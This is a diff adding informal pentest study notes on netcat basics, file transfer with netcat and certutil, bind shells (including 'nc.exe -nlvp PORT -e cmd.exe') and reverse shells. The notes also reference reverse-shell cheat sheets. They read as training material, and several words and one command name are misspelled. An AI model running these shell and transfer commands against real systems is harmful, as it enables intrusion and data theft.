@@ -80,8 +80,29 @@ nmap -sV IP_ADDRESS
 + i686-w64-mingw32-gcc file.c -o exploit -lws2_32
 
 ## Netcat fundamentals 
-+
-+
++ use to read and write data on TCP or UDP
++ Avaialbnle both nix and windows
++ Cleient Moide and then server mode 
+```
+nc -nv IP PORT
+certuil -urlcache -f http://IP/file_name
+nc.exe -nlvp PORT > test.txt sending 
+nc -nv IP PORT < test.txt file where have 
+```
+## Bind Shells
++ a bind shell is a type of remote shell where the attacker connects directly to a listenr on a target system.
++ /usr/share/windows-binaries/
++ nc.exe -nlvp PORT -e cmd.exe windows machine
++ nc -nv IP PORT
+
+## Reverse Shells 
++ reverse shell is a type of remote shell where the target connect directly to a listener on the attackers systemn allowinf for execution of commands on the target system
+
+## Reverse Shell Cheat Sheet 
++ Payload of all things Reverse Shellcheat sheet
++ revshells.com
+
+## Exploitation Framework 
 
 
 
